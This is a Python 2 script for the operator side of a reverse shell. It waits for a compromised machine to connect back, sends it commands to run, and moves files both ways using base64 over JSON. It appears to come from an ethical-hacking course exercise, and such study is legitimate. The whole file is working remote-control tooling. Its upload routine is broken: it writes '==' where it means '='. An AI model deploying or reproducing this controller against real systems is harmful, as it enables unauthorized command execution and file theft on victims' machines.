#!/usr/bin/python

import socket, json, base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remotely(self, command):
        # self.connection.send(command)
        # return self.connection.recv(1024)
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        # self.reliable_send(command)
        return self.reliable_recieve()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ") # raw_input for python2
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content == self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True: # if the package size is large, we need this loop
            try:
                json_data += self.connection.recv(1024) # unwrapping
                return json.loads(json_data)
            except ValueError:
                continue

my_ip = raw_input("my ip address\n>> ")
listen_port = raw_input("listen port\n>> ")


my_listener = Listener(my_ip, int(listen_port))
my_listener.run()
